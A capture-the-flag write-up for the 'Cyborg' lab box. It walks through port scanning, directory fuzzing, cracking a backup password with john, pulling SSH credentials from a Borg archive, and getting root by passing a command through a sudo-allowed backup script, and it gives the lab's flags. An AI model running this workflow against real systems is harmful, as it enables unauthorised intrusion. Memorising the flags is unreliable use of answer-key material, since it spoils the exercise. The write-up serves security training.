# Cyborg Writeup

> A box involving encrypted archives, source code analysis, and privilege escalation.

---

## 🧩 Initial Setup

Add the target to `/etc/hosts`:

```bash
echo "<IP> cyborg.thm" | sudo tee -a /etc/hosts
```

---

## 🔍 Task 1: Scan the Machine

### Question
How many ports are open?

### Approach

```bash
nmap -sV <IP>
```

### Result

Open ports:
- 22 (SSH)
- 80 (HTTP)

### Answer
```
2
```

---

## 🔍 Task 2: Service on Port 22

### Question
What service is running on port 22?

### Result

- SSH

### Answer
```
SSH
```

---

## 🔍 Task 3: Service on Port 80

### Question
What service is running on port 80?

### Result

- HTTP

### Answer
```
http
```

---

## 🔍 Task 4: User Flag

### Question
What is the `user.txt` flag?

---

### Step 1: Directory Enumeration

```bash
ffuf -u http://cyborg.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

Found:
- /admin
- /etc

---

### Step 2: Web Exploration

- /admin → archive file
- Users found: alex, josh, adam
- /etc → passwd, squid.conf

---

### Step 3: Password Cracking

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Password:
```
squidward
```

---

### Step 4: Extract Archive

```bash
tar xf archive.tar
```

---

### Step 5: Borg Extraction

```bash
borg extract /path/to/archive::music_archive
```

Password:
```
squidward
```

---

### Step 6: Credentials

```
alex:S3cretP@s3
```

---

### Step 7: SSH Login

```bash
ssh alex@<IP>
```

---

### Answer
```
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```

---

## 🔍 Task 5: Root Flag

### Question
What is the `root.txt` flag?

---

### Step 1: Check Sudo

```bash
sudo -l
```

Found:
```
/etc/mp3backups/backup.sh
```

---

### Step 2: Exploit

```bash
sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"
```

---

### Answer
```
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```

Report prepared by:  **zer0arc4**

